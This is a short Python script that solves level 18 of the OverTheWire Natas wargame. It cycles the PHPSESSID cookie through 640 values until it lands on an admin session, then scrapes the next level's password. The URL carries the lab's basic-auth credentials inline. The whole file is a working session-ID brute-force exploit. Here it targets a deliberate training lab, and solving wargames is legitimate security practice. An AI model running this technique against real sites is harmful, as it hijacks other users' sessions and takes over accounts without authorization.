import requests
import re

URL = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'        

def get_session(length):
    for i in range(length):
        r = requests.get(URL, cookies={'PHPSESSID': str(i)})
        if 'You are an admin.' in r.text:
            return re.findall(r'Password: [^<]*', r.text)[0].split(': ')[1]

if __name__ == '__main__':
    if requests.get(URL).status_code == requests.codes.ok:
         print(f'Password = {get_session(641)}')
    else:
        print('Authentication Failed!')
